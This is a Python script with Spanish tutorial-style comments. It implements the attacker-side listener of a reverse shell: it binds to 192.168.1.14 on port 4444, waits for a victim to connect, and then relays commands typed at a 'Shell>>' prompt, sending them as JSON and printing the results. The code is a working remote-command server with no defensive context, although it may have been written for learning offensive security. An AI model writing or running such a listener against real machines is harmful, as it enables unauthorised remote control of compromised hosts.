import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reestablece la conexión en caso de que se pierdan los paquetes (Reusa Address)

        listener.bind((ip, port))
    
        listener.listen(0)

        print('Servidor inicializado, esperando por conexiones')
        self.connection, address = listener.accept() #Aceptar conexiones
        print(f'[+] Conexión establecida con {address}\n')

    #Es importante mantener una integridad de los datos, es decir, asegurarnos de que ningún paquete se pierda durante la comunicación
    #Para ello es necesario convertirlos en formato json
    #Codificación json:
    def reliableSend(self, data):
        jsonData = json.dumps(data)
        self.connection.send(bytes(jsonData, 'utf-8'))

    #Decodificación json:
    def reliableRecieve(self):
        jsonData = ''
        while True:
            try:
                jsonData = self.connection.recv(4096)                
                return json.loads(jsonData.decode('utf-8'))
            
            except ValueError: continue

    def remoteAction(self, command):
        self.reliableSend(command)
        return self.reliableRecieve()

    def run(self):
            while True:
                command = input('Shell>> ')             
                result = self.remoteAction(command)
                print(result)

try:
    listener = Listener('192.168.1.14', 4444)
    listener.run()

except KeyboardInterrupt:
    print('\nPrograma Finalizado')